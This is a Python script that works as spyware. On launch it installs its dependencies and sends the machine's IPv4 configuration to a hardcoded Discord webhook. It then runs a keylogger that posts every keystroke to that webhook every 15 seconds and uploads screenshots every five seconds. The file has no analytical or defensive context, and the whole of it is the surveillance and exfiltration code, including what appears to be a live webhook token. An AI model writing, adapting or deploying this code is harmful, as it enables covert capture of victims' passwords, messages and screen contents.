import os

# Ensure required packages are installed
os.system("pip install requests pyautogui pynput")

import requests
import subprocess
import pyautogui
import threading
import time
from pynput import keyboard

WEBHOOK_URL = "https://discord.com/api/webhooks/1352325015005036576/SVpwRu0co0hN0ekdKBHSe28ZgVZ5oK5y2fOCkKlWBRbMjlpw4nVBSeG6SYwUnibxaLYl"

stop_screenshots = threading.Event()
key_buffer = []
key_lock = threading.Lock()

def send_ipconfig_to_discord():
    try:
        result = subprocess.run(["ipconfig"], capture_output=True, text=True, shell=True)
        output = result.stdout
        ipv4_lines = [line for line in output.splitlines() if "IPv4" in line]
        ipv4_info = "\n".join(ipv4_lines) if ipv4_lines else output
        requests.post(WEBHOOK_URL, data={"content": f"🖧 ipconfig info:\n{ipv4_info}"})
    except Exception as e:
        print(f"[!] Error sending ipconfig info: {e}")

def send_screenshot_to_discord():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            files = {"file": f}
            requests.post(WEBHOOK_URL, files=files)
        os.remove("screenshot.png")
    except Exception as e:
        print(f"[!] Error sending screenshot: {e}")

def screenshot_loop():
    while not stop_screenshots.is_set():
        send_screenshot_to_discord()
        time.sleep(5)

def on_press(key):
    global stop_screenshots
    try:
        if key == keyboard.Key.f8:
            stop_screenshots.set()
        else:
            with key_lock:
                if hasattr(key, 'char') and key.char is not None:
                    key_buffer.append(key.char)
                else:
                    key_buffer.append(f"[{key}]")
    except Exception:
        pass

def send_keys_to_discord():
    while True:
        time.sleep(15)
        with key_lock:
            if key_buffer:
                sentence = ''.join(key_buffer)
                requests.post(WEBHOOK_URL, data={"content": f"🖮 Keylog:\n{sentence}"})
                key_buffer.clear()

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Start everything on program open
send_ipconfig_to_discord()
start_keylogger()
threading.Thread(target=screenshot_loop, daemon=True).start()
threading.Thread(target=send_keys_to_discord, daemon=True).start()

# Keep main thread alive
while not stop_screenshots.is_set():
    time.sleep(1)
